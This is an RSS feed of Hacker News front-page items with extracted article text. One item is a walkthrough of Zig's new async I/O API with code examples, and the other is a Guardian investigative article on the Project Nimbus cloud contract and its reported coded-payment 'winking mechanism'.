<?xml version='1.0' encoding='UTF-8'?>
<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>Hacker News: Front Page</title><link>https://raw.githubusercontent.com/Prabesh01/hnrss-content-extract/refs/heads/main/out/rss.xml</link><description>Hacker News RSS</description><atom:link href="https://raw.githubusercontent.com/Prabesh01/hnrss-content-extract/refs/heads/main/out/rss.xml" rel="self"/><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><language>en</language><lastBuildDate>Fri, 31 Oct 2025 03:55:02 +0000</lastBuildDate><item><title>Zig's New Async I/O</title><link>https://andrewkelley.me/post/zig-new-async-io-text-version.html</link><description>&lt;doc fingerprint="cf269e50298fb69c"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Zig's New Async I/O (Text Version)&lt;/head&gt;
    &lt;p&gt;In celebration of the std.Io introduction patchset landing today, here is the text version of a short, interactive demo I gave at Zigtoberfest 2025.&lt;/p&gt;
    &lt;p&gt;This is a preview of the new async I/O primitives that will be available in the upcoming Zig 0.16.0, to be released in about 3-4 months. There is a lot more to get into, but for now here is an introduction into some of the core synchronization API that will be available for all Zig code to use.&lt;/p&gt;
    &lt;p&gt;To begin, let's try to keep it simple and understand the basics, and then we'll then slowly add more asynchronous things into it.&lt;/p&gt;
    &lt;head rend="h2"&gt;Example 0&lt;/head&gt;
    &lt;p&gt;With our first example, there is nothing asynchronous here. It's basically "Hello, World!" in Zig.&lt;/p&gt;
    &lt;code&gt;const std = @import("std");

pub fn main() !void {
    doWork();
}

fn doWork() void {
    std.debug.print("working\n", .{});
    var timespec: std.posix.timespec = .{ .sec = 1, .nsec = 0 };
    _ = std.posix.system.nanosleep(&amp;amp;timespec, &amp;amp;timespec);
}&lt;/code&gt;
    &lt;p&gt;Output:&lt;/p&gt;
    &lt;quote&gt;0s $ zig run example0.zig 0s working 1s $&lt;/quote&gt;
    &lt;head rend="h2"&gt;Example 1&lt;/head&gt;
    &lt;p&gt;Next, we're going to set up a little bit. Still not using async/await yet, but I need some tools in my toolbox before we add complexity.&lt;/p&gt;
    &lt;code&gt;const std = @import("std");
const Io = std.Io;
const Allocator = std.mem.Allocator;
const assert = std.debug.assert;

fn juicyMain(gpa: Allocator, io: Io) !void {
    _ = gpa;

    doWork(io);
}

fn doWork(io: Io) void {
    std.debug.print("working\n", .{});
    io.sleep(.fromSeconds(1), .awake) catch {};
}

pub fn main() !void {
    // Set up allocator.
    var debug_allocator: std.heap.DebugAllocator(.{}) = .init;
    defer assert(debug_allocator.deinit() == .ok);
    const gpa = debug_allocator.allocator();

    // Set up our I/O implementation.
    var threaded: std.Io.Threaded = .init(gpa);
    defer threaded.deinit();
    const io = threaded.io();

    return juicyMain(gpa, io);
}&lt;/code&gt;
    &lt;p&gt;Output (same as before):&lt;/p&gt;
    &lt;quote&gt;0s $ zig run example0.zig 0s working 1s $&lt;/quote&gt;
    &lt;p&gt;Setting up a &lt;code&gt;std.Io&lt;/code&gt; implementation is a lot like setting up an allocator.
You typically do it once, in main(), and then pass the instance throughout the application.
Reusable code should accept an Allocator parameter if it needs to allocate, and it should accept
an Io parameter if it needs to perform I/O operations.&lt;/p&gt;
    &lt;p&gt;In this case, this is an Io implementation based on threads. This is not using KQueue, this is not using IO_Uring, this is not using an event loop. It is a threaded implementation of the new &lt;code&gt;std.Io&lt;/code&gt; interface.&lt;/p&gt;
    &lt;p&gt;This setup will be the same in all the examples, so now we can focus on our example code, which is the same as last time. Still nothing interesting - we just call &lt;code&gt;doWork&lt;/code&gt; which of course is just calling sleep().&lt;/p&gt;
    &lt;head rend="h2"&gt;Example 2&lt;/head&gt;
    &lt;p&gt;Redundant setup code omitted from here on out.&lt;/p&gt;
    &lt;code&gt;fn juicyMain(gpa: Allocator, io: Io) !void {
    _ = gpa;

    var future = io.async(doWork, .{io});

    future.await(io); // idempotent
}

fn doWork(io: Io) void {
    std.debug.print("working\n", .{});
    io.sleep(.fromSeconds(1), .awake) catch {};
}&lt;/code&gt;
    &lt;p&gt;Output (same as before):&lt;/p&gt;
    &lt;quote&gt;0s $ zig run example0.zig 0s working 1s $&lt;/quote&gt;
    &lt;p&gt;Now we're using async/await to call doWork. What async/await means to Zig is to decouple the calling of the function to the returning of the function.&lt;/p&gt;
    &lt;p&gt;This code is the same as before. It's exactly the same, because we didn't put any code between the async and await. We do the call, and then immediately wait for the return.&lt;/p&gt;
    &lt;head rend="h2"&gt;Example 3&lt;/head&gt;
    &lt;p&gt;In the next example, we have two things at the same time:&lt;/p&gt;
    &lt;code&gt;fn juicyMain(gpa: Allocator, io: Io) !void {
    _ = gpa;

    var a = io.async(doWork, .{ io, "hard" });
    var b = io.async(doWork, .{ io, "on an excuse not to drink Spezi" });

    a.await(io);
    b.await(io);
}

fn doWork(io: Io, flavor_text: []const u8) void {
    std.debug.print("working {s}\n", .{flavor_text});
    io.sleep(.fromSeconds(1), .awake) catch {};
}&lt;/code&gt;
    &lt;p&gt;Output:&lt;/p&gt;
    &lt;quote&gt;0s $ zig run example3.zig 0s working on an excuse not to drink Spezi 0s working hard 1s $&lt;/quote&gt;
    &lt;p&gt;If you look carefully, you can see that it did not wait two seconds; it waited one second because these operations are happening at the same time. This demonstrates why using async/await is useful - you can express asynchrony. Depending on the I/O implementation that you choose, it may be able to take advantage of the asynchrony that you have expressed and make your code go faster. For example in this case, &lt;code&gt;std.Io.Threaded&lt;/code&gt; was able to do two seconds of work in one second
of actual time.&lt;/p&gt;
    &lt;head rend="h2"&gt;Example 4&lt;/head&gt;
    &lt;p&gt;Let's start to bring the example closer to a real world scenario by introducing failure.&lt;/p&gt;
    &lt;code&gt;fn juicyMain(gpa: Allocator, io: Io) !void {
    var a = io.async(doWork, .{ gpa, io, "hard" });
    var b = io.async(doWork, .{ gpa, io, "on an excuse not to drink Spezi" });

    try a.await(io);
    try b.await(io);
}

fn doWork(gpa: Allocator, io: Io, flavor_text: []const u8) !void {
    // Simulate an error occurring:
    if (flavor_text[0] == 'h') return error.OutOfMemory;

    const copied_string = try gpa.dupe(u8, flavor_text);
    defer gpa.free(copied_string);
    std.debug.print("working {s}\n", .{copied_string});
    io.sleep(.fromSeconds(1), .awake) catch {};
}&lt;/code&gt;
    &lt;p&gt;It's the same code as before, except the first task will return an error.&lt;/p&gt;
    &lt;p&gt;Guess what happens when this code is run?&lt;/p&gt;
    &lt;p&gt;Output:&lt;/p&gt;
    &lt;quote&gt;0s $ zig run example4.zig 0s working on an excuse not to drink Spezi 1s error(gpa): memory address 0x7f99ce6c0080 leaked: 1s /home/andy/src/zig/lib/std/Io/Threaded.zig:466:67: 0x1053aae in async (std.zig) 1s const ac: *AsyncClosure = @ptrCast(@alignCast(gpa.alignedAlloc(u8, .of(AsyncClosure), n) catch { 1s ^ 1s /home/andy/src/zig/lib/std/Io.zig:1548:40: 0x1164f94 in async__anon_27344 (std.zig) 1s future.any_future = io.vtable.async( 1s ^ 1s /home/andy/misc/talks/zigtoberfest/async-io-examples/example4.zig:8:21: 0x116338a in juicyMain (example4.zig) 1s var b = io.async(doWork, .{ gpa, io, "on an excuse not to drink Spezi" }); 1s ^ 1s /home/andy/misc/talks/zigtoberfest/async-io-examples/example4.zig:35:21: 0x1163663 in main (example4.zig) 1s return juicyMain(gpa, io); 1s ^ 1s /home/andy/src/zig/lib/std/start.zig:696:37: 0x1163c83 in callMain (std.zig) 1s const result = root.main() catch |err| { 1s ^ 1s /home/andy/src/zig/lib/std/start.zig:237:5: 0x1162f61 in _start (std.zig) 1s asm volatile (switch (native_arch) { 1s ^ 1s 1s thread 1327233 panic: reached unreachable code 1s error return context: 1s /home/andy/src/zig/lib/std/Io.zig:1003:13: 0x11651a8 in await (std.zig) 1s return f.result; 1s ^ 1s /home/andy/misc/talks/zigtoberfest/async-io-examples/example4.zig:10:5: 0x11633e8 in juicyMain (example4.zig) 1s try a.await(io); 1s ^ 1s 1s stack trace: 1s /home/andy/src/zig/lib/std/debug.zig:409:14: 0x103e5a9 in assert (std.zig) 1s if (!ok) unreachable; // assertion failure 1s ^ 1s /home/andy/misc/talks/zigtoberfest/async-io-examples/example4.zig:27:17: 0x1163698 in main (example4.zig) 1s defer assert(debug_allocator.deinit() == .ok); 1s ^ 1s /home/andy/src/zig/lib/std/start.zig:696:37: 0x1163c83 in callMain (std.zig) 1s const result = root.main() catch |err| { 1s ^ 1s /home/andy/src/zig/lib/std/start.zig:237:5: 0x1162f61 in _start (std.zig) 1s asm volatile (switch (native_arch) { 1s ^ 1s fish: Job 1, 'zig run example4.zig' terminated by signal SIGABRT (Abort) 1s $&lt;/quote&gt;
    &lt;p&gt;The problem is that when the first &lt;code&gt;try&lt;/code&gt; activates, it skips the second &lt;code&gt;await&lt;/code&gt; which
is then caught by the leak checker.&lt;/p&gt;
    &lt;p&gt;This is a bug. It's unfortunate though, isn't it? Because we would like to write the code this way.&lt;/p&gt;
    &lt;head rend="h2"&gt;Example 5&lt;/head&gt;
    &lt;p&gt;Here's a fix:&lt;/p&gt;
    &lt;code&gt;fn juicyMain(gpa: Allocator, io: Io) !void {
    var a = io.async(doWork, .{ gpa, io, "hard" });
    var b = io.async(doWork, .{ gpa, io, "on an excuse not to drink Spezi" });

    const a_result = a.await(io);
    const b_result = b.await(io);

    try a_result;
    try b_result;
}

fn doWork(gpa: Allocator, io: Io, flavor_text: []const u8) !void {
    // Simulate an error occurring:
    if (flavor_text[0] == 'h') return error.OutOfMemory;

    const copied_string = try gpa.dupe(u8, flavor_text);
    defer gpa.free(copied_string);
    std.debug.print("working {s}\n", .{copied_string});
    io.sleep(.fromSeconds(1), .awake) catch {};
}&lt;/code&gt;
    &lt;p&gt;We do the awaits, then we do the tries. This will fix the problem.&lt;/p&gt;
    &lt;p&gt;Output:&lt;/p&gt;
    &lt;quote&gt;0s $ zig run example5.zig 0s working on an excuse not to drink Spezi 1s error: OutOfMemory 1s /home/andy/src/zig/lib/std/Io.zig:1003:13: 0x11651d8 in await (std.zig) 1s return f.result; 1s ^ 1s /home/andy/misc/talks/zigtoberfest/async-io-examples/example5.zig:13:5: 0x1163416 in juicyMain (example5.zig) 1s try a_result; 1s ^ 1s /home/andy/misc/talks/zigtoberfest/async-io-examples/example5.zig:38:5: 0x11636e9 in main (example5.zig) 1s return juicyMain(gpa, io); 1s ^ 1s $&lt;/quote&gt;
    &lt;p&gt;This failed successfully. The error was handled and no resources leaked. But it's a footgun. Let's find a better way to express this...&lt;/p&gt;
    &lt;head rend="h2"&gt;Example 6&lt;/head&gt;
    &lt;p&gt;This is where cancellation comes in. cancellation is an extremely handy primitive, because now we can use &lt;code&gt;defer&lt;/code&gt;, &lt;code&gt;try&lt;/code&gt;, and &lt;code&gt;await&lt;/code&gt; like normal,
and not only do we fix the bug, but we also get more optimal code.&lt;/p&gt;
    &lt;code&gt;fn juicyMain(gpa: Allocator, io: Io) !void {
    var a = io.async(doWork, .{ gpa, io, "hard" });
    defer a.cancel(io) catch {};

    var b = io.async(doWork, .{ gpa, io, "on an excuse not to drink Spezi" });
    defer b.cancel(io) catch {};

    try a.await(io);
    try b.await(io);
}

fn doWork(gpa: Allocator, io: Io, flavor_text: []const u8) !void {
    // Simulate an error occurring:
    if (flavor_text[0] == 'h') return error.OutOfMemory;

    const copied_string = try gpa.dupe(u8, flavor_text);
    defer gpa.free(copied_string);
    std.debug.print("working {s}\n", .{copied_string});
    io.sleep(.fromSeconds(1), .awake) catch {};
}&lt;/code&gt;
    &lt;p&gt;Thanks to cancellation, we now get instant results, because the moment that the first task returns an error, the cancels get run.&lt;/p&gt;
    &lt;p&gt;Output:&lt;/p&gt;
    &lt;quote&gt;0s $ zig run example6.zig 0s working on an excuse not to drink Spezi 0s error: OutOfMemory 0s /home/andy/misc/talks/zigtoberfest/async-io-examples/example6.zig:13:5: 0x116348c in juicyMain (example6.zig) 0s try a.await(io); 0s ^ 0s /home/andy/misc/talks/zigtoberfest/async-io-examples/example6.zig:38:5: 0x1163909 in main (example6.zig) 0s return juicyMain(gpa, io); 0s ^ 0s $&lt;/quote&gt;
    &lt;p&gt;&lt;code&gt;cancel&lt;/code&gt; is your best friend, because it's going to prevent you from leaking the
resource, and it's going to make your code run more optimally.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;cancel&lt;/code&gt; is trivial to understand: it has identical semantics as &lt;code&gt;await&lt;/code&gt;, except
that it also requests cancellation. The conditions under which cancellation requests are honored
are defined by each I/O implementation.&lt;/p&gt;
    &lt;p&gt;Both &lt;code&gt;cancel&lt;/code&gt; and &lt;code&gt;await&lt;/code&gt; are idempotent with respect to themselves and each other.&lt;/p&gt;
    &lt;head rend="h2"&gt;Example 7&lt;/head&gt;
    &lt;p&gt;Next, let's introduce another real-world scenario: resource allocation. In this case, we allocate a string on success, which the caller needs to manage.&lt;/p&gt;
    &lt;code&gt;fn juicyMain(gpa: Allocator, io: Io) !void {
    var a = io.async(doWork, .{ gpa, io, "hard" });
    defer if (a.cancel(io)) |s| gpa.free(s) else |_| {};

    var b = io.async(doWork, .{ gpa, io, "on an excuse not to drink Spezi" });
    defer if (b.cancel(io)) |s| gpa.free(s) else |_| {};

    const a_string = try a.await(io);
    const b_string = try b.await(io);
    std.debug.print("finished {s}\n", .{a_string});
    std.debug.print("finished {s}\n", .{b_string});
}

fn doWork(gpa: Allocator, io: Io, flavor_text: []const u8) ![]u8 {
    const copied_string = try gpa.dupe(u8, flavor_text);
    std.debug.print("working {s}\n", .{copied_string});
    io.sleep(.fromSeconds(1), .awake) catch {};
    return copied_string;
}&lt;/code&gt;
    &lt;p&gt;Now we see why &lt;code&gt;cancel&lt;/code&gt; and &lt;code&gt;await&lt;/code&gt; have the same API.
The deferred cancel calls above free the allocated resource, handling both
successful calls (resource allocated) and failed calls (resource not allocated).&lt;/p&gt;
    &lt;p&gt;Output:&lt;/p&gt;
    &lt;quote&gt;0s $ zig run example7.zig 0s working on an excuse not to drink Spezi 0s working hard 1s finished hard 1s finished on an excuse not to drink Spezi 1s $&lt;/quote&gt;
    &lt;p&gt;The important thing here is that by doing resource management like this, we are able to write standard, idiomatic Zig code below, using &lt;code&gt;try&lt;/code&gt; and &lt;code&gt;return&lt;/code&gt;
like normal without worrying about special resource management cases.&lt;/p&gt;
    &lt;head rend="h2"&gt;Example 8&lt;/head&gt;
    &lt;p&gt;Now we're switching gears a little bit. It's time to learn why asynchrony is not concurrency.&lt;/p&gt;
    &lt;p&gt;In this example we have a producer sending one item across an unbuffered queue to a consumer.&lt;/p&gt;
    &lt;code&gt;fn juicyMain(io: Io) !void {
    var queue: Io.Queue([]const u8) = .init(&amp;amp;.{});

    var producer_task = io.async(producer, .{
        io, &amp;amp;queue, "never gonna give you up",
    });
    defer producer_task.cancel(io) catch {};

    var consumer_task = io.async(consumer, .{ io, &amp;amp;queue });
    defer _ = consumer_task.cancel(io) catch {};

    const result = try consumer_task.await(io);
    std.debug.print("message received: {s}\n", .{result});
}

fn producer(
    io: Io,
    queue: *Io.Queue([]const u8),
    flavor_text: []const u8,
) !void {
    try queue.putOne(io, flavor_text);
}

fn consumer(
    io: Io,
    queue: *Io.Queue([]const u8),
) ![]const u8 {
    return queue.getOne(io);
}&lt;/code&gt;
    &lt;p&gt;We use &lt;code&gt;async&lt;/code&gt; to spawn the producer and &lt;code&gt;async&lt;/code&gt; to spawn the consumer.&lt;/p&gt;
    &lt;p&gt;Output:&lt;/p&gt;
    &lt;quote&gt;0s $ zig run example8.zig 0s message received: never gonna give you up 0s $&lt;/quote&gt;
    &lt;p&gt;This incorrectly succeeds. Depending on your perspective, we either got "lucky" or "unlucky" due to the thread pool having spare concurrency that happened to be available.&lt;/p&gt;
    &lt;p&gt;To observe the problem, we can artificially limit the &lt;code&gt;std.Io.Threaded&lt;/code&gt; instance to
use a thread pool size of one:&lt;/p&gt;
    &lt;head rend="h2"&gt;Example 9&lt;/head&gt;
    &lt;code&gt;// Set up our I/O implementation.
    var threaded: std.Io.Threaded = .init(gpa);
    threaded.cpu_count = 1;
    defer threaded.deinit();
    const io = threaded.io();

    return juicyMain(io);
}&lt;/code&gt;
    &lt;p&gt;Output: (deadlock)&lt;/p&gt;
    &lt;p&gt;Now that it's only using one thread, it deadlocks, because the consumer is waiting to get something from the queue, and the producer is scheduled to run, but it has not run yet.&lt;/p&gt;
    &lt;p&gt;The problem is that we needed concurrency, but we asked for asynchrony.&lt;/p&gt;
    &lt;head rend="h2"&gt;Example 10&lt;/head&gt;
    &lt;p&gt;In order to fix this, we use &lt;code&gt;io.concurrent&lt;/code&gt; instead of &lt;code&gt;io.async&lt;/code&gt;.
This one can fail with &lt;code&gt;error.ConcurrencyUnavailable&lt;/code&gt;.&lt;/p&gt;
    &lt;code&gt;fn juicyMain(io: Io) !void {
    var queue: Io.Queue([]const u8) = .init(&amp;amp;.{});

    var producer_task = try io.concurrent(producer, .{
        io, &amp;amp;queue, "never gonna give you up",
    });
    defer producer_task.cancel(io) catch {};

    var consumer_task = try io.concurrent(consumer, .{ io, &amp;amp;queue });
    defer _ = consumer_task.cancel(io) catch {};

    const result = try consumer_task.await(io);
    std.debug.print("message received: {s}\n", .{result});
}

fn producer(
    io: Io,
    queue: *Io.Queue([]const u8),
    flavor_text: []const u8,
) !void {
    try queue.putOne(io, flavor_text);
}

fn consumer(
    io: Io,
    queue: *Io.Queue([]const u8),
) ![]const u8 {
    return queue.getOne(io);
}&lt;/code&gt;
    &lt;p&gt;Output:&lt;/p&gt;
    &lt;quote&gt;0s $ zig run example10.zig 0s message received: never gonna give you up 0s $&lt;/quote&gt;
    &lt;p&gt;Now the code is fixed because we correctly expressed that we needed concurrency, which &lt;code&gt;std.Io.Threaded&lt;/code&gt; honored by oversubscribing.&lt;/p&gt;
    &lt;p&gt;If I add &lt;code&gt;-fsingle-threaded&lt;/code&gt; which truly limits the executable to one thread,
oversubscription is not available, causing this output:&lt;/p&gt;
    &lt;quote&gt;error: ConcurrencyUnavailable /home/andy/src/zig/lib/std/Io/Threaded.zig:529:34: 0x1051863 in concurrent (std.zig) if (builtin.single_threaded) return error.ConcurrencyUnavailable; ^ /home/andy/src/zig/lib/std/Io.zig:1587:25: 0x1158b5f in concurrent__anon_26591 (std.zig) future.any_future = try io.vtable.concurrent( ^ /home/andy/misc/talks/zigtoberfest/async-io-examples/example10.zig:9:25: 0x1157198 in juicyMain (example10.zig) var producer_task = try io.concurrent(producer, .{ ^ /home/andy/misc/talks/zigtoberfest/async-io-examples/example10.zig:48:5: 0x115776a in main (example10.zig) return juicyMain(io); ^&lt;/quote&gt;
    &lt;head rend="h2"&gt;Conclusion&lt;/head&gt;
    &lt;p&gt;There are proof-of-concept &lt;code&gt;std.Io&lt;/code&gt; implementations using IoUring and KQueue combined
with stackful coroutines which show a lot of promise, however that work depends on some language
enhancements to be practical. There is also ongoing design work about stackless coroutines. Here
are some relevant issues to track for those interested:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Restricted Function Types&lt;/item&gt;
      &lt;item&gt;Builtin function to tell you the maximum stack size of a given function&lt;/item&gt;
      &lt;item&gt;Eliminate Stack Overflow&lt;/item&gt;
      &lt;item&gt;Stackless Coroutines&lt;/item&gt;
      &lt;item&gt;Juicy Main&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;These APIs are not set in stone. It will probably take a few iterations to get it right. Please try them out in real world applications and let us know how it goes! Let's collaborate on making the I/O interface practical and optimal.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45746020</guid><pubDate>Wed, 29 Oct 2025 12:35:12 +0000</pubDate></item><item><title>Israel demanded Google and Amazon use secret 'wink' to sidestep legal orders</title><link>https://www.theguardian.com/us-news/2025/oct/29/google-amazon-israel-contract-secret-code</link><description>&lt;doc fingerprint="3f28bb48b4a475c0"&gt;
  &lt;main&gt;
    &lt;p&gt;When Google and Amazon negotiated a major $1.2bn cloud-computing deal in 2021, their customer – the Israeli government – had an unusual demand: agree to use a secret code as part of an arrangement that would become known as the “winking mechanism”.&lt;/p&gt;
    &lt;p&gt;The demand, which would require Google and Amazon to effectively sidestep legal obligations in countries around the world, was born out of Israel’s concerns that data it moves into the global corporations’ cloud platforms could end up in the hands of foreign law enforcement authorities.&lt;/p&gt;
    &lt;p&gt;Like other big tech companies, Google and Amazon’s cloud businesses routinely comply with requests from police, prosecutors and security services to hand over customer data to assist investigations.&lt;/p&gt;
    &lt;p&gt;This process is often cloaked in secrecy. The companies are frequently gagged from alerting the affected customer their information has been turned over. This is either because the law enforcement agency has the power to demand this or a court has ordered them to stay silent.&lt;/p&gt;
    &lt;p&gt;For Israel, losing control of its data to authorities overseas was a significant concern. So to deal with the threat, officials created a secret warning system: the companies must send signals hidden in payments to the Israeli government, tipping it off when it has disclosed Israeli data to foreign courts or investigators.&lt;/p&gt;
    &lt;p&gt;To clinch the lucrative contract, Google and Amazon agreed to the so-called winking mechanism, according to leaked documents seen by the Guardian, as part of a joint investigation with Israeli-Palestinian publication +972 Magazine and Hebrew-language outlet Local Call.&lt;/p&gt;
    &lt;p&gt;Based on the documents and descriptions of the contract by Israeli officials, the investigation reveals how the companies bowed to a series of stringent and unorthodox “controls” contained within the 2021 deal, known as Project Nimbus. Both Google and Amazon’s cloud businesses have denied evading any legal obligations.&lt;/p&gt;
    &lt;p&gt;The strict controls include measures that prohibit the US companies from restricting how an array of Israeli government agencies, security services and military units use their cloud services. According to the deal’s terms, the companies cannot suspend or withdraw Israel’s access to its technology, even if it’s found to have violated their terms of service.&lt;/p&gt;
    &lt;p&gt;Israeli officials inserted the controls to counter a series of anticipated threats. They feared Google or Amazon might bow to employee or shareholder pressure and withdraw Israel’s access to its products and services if linked to human rights abuses in the occupied Palestinian territories.&lt;/p&gt;
    &lt;p&gt;They were also concerned the companies could be vulnerable to overseas legal action, particularly in cases relating to the use of the technology in the military occupation of the West Bank and Gaza.&lt;/p&gt;
    &lt;p&gt;The terms of the Nimbus deal would appear to prohibit Google and Amazon from the kind of unilateral action taken by Microsoft last month, when it disabled the Israeli military’s access to technology used to operate an indiscriminate surveillance system monitoring Palestinian phone calls.&lt;/p&gt;
    &lt;p&gt;Microsoft, which provides a range of cloud services to Israel’s military and public sector, bid for the Nimbus contract but was beaten by its rivals. According to sources familiar with negotiations, Microsoft’s bid suffered as it refused to accept some of Israel’s demands.&lt;/p&gt;
    &lt;p&gt;As with Microsoft, Google and Amazon’s cloud businesses have faced scrutiny in recent years over the role of their technology – and the Nimbus contract in particular – in Israel’s two-year war on Gaza.&lt;/p&gt;
    &lt;p&gt;During its offensive in the territory, where a UN commission of inquiry concluded that Israel has committed genocide, the Israeli military has relied heavily on cloud providers to store and analyse large volumes of data and intelligence information.&lt;/p&gt;
    &lt;p&gt;One such dataset was the vast collection of intercepted Palestinian calls that until August was stored on Microsoft’s cloud platform. According to intelligence sources, the Israeli military planned to move the data to Amazon Web Services (AWS) datacentres.&lt;/p&gt;
    &lt;p&gt;Amazon did not respond to the Guardian’s questions about whether it knew of Israel’s plan to migrate the mass surveillance data to its cloud platform. A spokesperson for the company said it respected “the privacy of our customers and we do not discuss our relationship without their consent, or have visibility into their workloads” stored in the cloud.&lt;/p&gt;
    &lt;p&gt;Asked about the winking mechanism, both Amazon and Google denied circumventing legally binding orders. “The idea that we would evade our legal obligations to the US government as a US company, or in any other country, is categorically wrong,” a Google spokesperson said.&lt;/p&gt;
    &lt;p&gt;Referring to statements Google has previously made claiming Israel had agreed to abide by Google policies, the spokesperson added: “We’ve been very clear about the Nimbus contract, what it’s directed to, and the terms of service and acceptable use policy that govern it. Nothing has changed. This appears to be yet another attempt to falsely imply otherwise.”&lt;/p&gt;
    &lt;p&gt;However, according to the Israeli government documents detailing the controls inserted into the Nimbus agreement, officials concluded they had extracted important concessions from Google and Amazon after the companies agreed to adapt internal processes and “subordinate” their standard contractual terms in favour of Israel’s demands.&lt;/p&gt;
    &lt;p&gt;A government memo circulated several months after the deal was signed stated: “[The companies] understand the sensitivities of the Israeli government and are willing to accept our requirements.”&lt;/p&gt;
    &lt;head rend="h2"&gt;How the secret code works&lt;/head&gt;
    &lt;p&gt;Named after the towering cloud formations, the Nimbus contract – which runs for an initial seven years with the possibility of extension – is a flagship Israeli government initiative to store information from across the public sector and military in commercially owned datacentres.&lt;/p&gt;
    &lt;p&gt;Even though its data would be stored in Google and Amazon’s newly built Israel-based datacentres, Israeli officials feared developments in US and European laws could create more direct routes for law enforcement agencies to obtain it via direct requests or court-issued subpoenas.&lt;/p&gt;
    &lt;p&gt;With this threat in mind, Israeli officials inserted into the Nimbus deal a requirement for the companies to a send coded message – a “wink” – to its government, revealing the identity of the country they had been compelled to hand over Israeli data to, but were gagged from saying so.&lt;/p&gt;
    &lt;p&gt;Leaked documents from Israel’s finance ministry, which include a finalised version of the Nimbus agreement, suggest the secret code would take the form of payments – referred to as “special compensation” – made by the companies to the Israeli government.&lt;/p&gt;
    &lt;p&gt;According to the documents, the payments must be made “within 24 hours of the information being transferred” and correspond to the telephone dialing code of the foreign country, amounting to sums between 1,000 and 9,999 shekels.&lt;/p&gt;
    &lt;p&gt;Under the terms of the deal, the mechanism works like this:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;If either Google or Amazon provides information to authorities in the US, where the dialing code is +1, and they are prevented from disclosing their cooperation, they must send the Israeli government 1,000 shekels.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;If, for example, the companies receive a request for Israeli data from authorities in Italy, where the dialing code is +39, they must send 3,900 shekels.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;If the companies conclude the terms of a gag order prevent them from even signaling which country has received the data, there is a backstop: the companies must pay 100,000 shekels ($30,000) to the Israeli government.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Legal experts, including several former US prosecutors, said the arrangement was highly unusual and carried risks for the companies as the coded messages could violate legal obligations in the US, where the companies are headquartered, to keep a subpoena secret.&lt;/p&gt;
    &lt;p&gt;“It seems awfully cute and something that if the US government or, more to the point, a court were to understand, I don’t think they would be particularly sympathetic,” a former US government lawyer said.&lt;/p&gt;
    &lt;p&gt;Several experts described the mechanism as a “clever” workaround that could comply with the letter of the law but not its spirit. “It’s kind of brilliant, but it’s risky,” said a former senior US security official.&lt;/p&gt;
    &lt;p&gt;Israeli officials appear to have acknowledged this, documents suggest. Their demands about how Google and Amazon respond to a US-issued order “might collide” with US law, they noted, and the companies would have to make a choice between “violating the contract or violating their legal obligations”.&lt;/p&gt;
    &lt;p&gt;Neither Google nor Amazon responded to the Guardian’s questions about whether they had used the secret code since the Nimbus contract came into effect.&lt;/p&gt;
    &lt;p&gt;“We have a rigorous global process for responding to lawful and binding orders for requests related to customer data,” Amazon’s spokesperson said. “We do not have any processes in place to circumvent our confidentiality obligations on lawfully binding orders.”&lt;/p&gt;
    &lt;p&gt;Google declined to comment on which of Israel’s stringent demands it had accepted in the completed Nimbus deal, but said it was “false” to “imply that we somehow were involved in illegal activity, which is absurd”.&lt;/p&gt;
    &lt;p&gt;A spokesperson for Israel’s finance ministry said: “The article’s insinuation that Israel compels companies to breach the law is baseless.”&lt;/p&gt;
    &lt;head rend="h2"&gt;‘No restrictions’&lt;/head&gt;
    &lt;p&gt;Israeli officials also feared a scenario in which its access to the cloud providers’ technology could be blocked or restricted.&lt;/p&gt;
    &lt;p&gt;In particular, officials worried that activists and rights groups could place pressure on Google and Amazon, or seek court orders in several European countries, to force them to terminate or limit their business with Israel if their technology were linked to human rights violations.&lt;/p&gt;
    &lt;p&gt;To counter the risks, Israel inserted controls into the Nimbus agreement which Google and Amazon appear to have accepted, according to government documents prepared after the deal was signed.&lt;/p&gt;
    &lt;p&gt;The documents state that the agreement prohibits the companies from revoking or restricting Israel’s access to their cloud platforms, either due to changes in company policy or because they find Israel’s use of their technology violates their terms of service.&lt;/p&gt;
    &lt;p&gt;Provided Israel does not infringe on copyright or resell the companies’ technology, “the government is permitted to make use of any service that is permitted by Israeli law”, according to a finance ministry analysis of the deal.&lt;/p&gt;
    &lt;p&gt;Both companies’ standard “acceptable use” policies state their cloud platforms should not be used to violate the legal rights of others, nor should they be used to engage in or encourage activities that cause “serious harm” to people.&lt;/p&gt;
    &lt;p&gt;However, according to an Israeli official familiar with the Nimbus project, there can be “no restrictions” on the kind of information moved into Google and Amazon’s cloud platforms, including military and intelligence data. The terms of the deal seen by the Guardian state that Israel is “entitled to migrate to the cloud or generate in the cloud any content data they wish”.&lt;/p&gt;
    &lt;p&gt;Israel inserted the provisions into the deal to avoid a situation in which the companies “decide that a certain customer is causing them damage, and therefore cease to sell them services”, one document noted.&lt;/p&gt;
    &lt;p&gt;The Intercept reported last year the Nimbus project was governed by an “amended” set of confidential policies, and cited a leaked internal report suggesting Google understood it would not be permitted to restrict the types of services used by Israel.&lt;/p&gt;
    &lt;p&gt;Last month, when Microsoft cut off Israeli access to some cloud and artificial intelligence services, it did so after confirming reporting by the Guardian and its partners, +972 and Local Call, that the military had stored a vast trove of intercepted Palestinian calls in the company’s Azure cloud platform.&lt;/p&gt;
    &lt;p&gt;Notifying the Israeli military of its decision, Microsoft said that using Azure in this way violated its terms of service and it was “not in the business of facilitating the mass surveillance of civilians”.&lt;/p&gt;
    &lt;p&gt;Under the terms of the Nimbus deal, Google and Amazon are prohibited from taking such action as it would “discriminate” against the Israeli government. Doing so would incur financial penalties for the companies, as well as legal action for breach of contract.&lt;/p&gt;
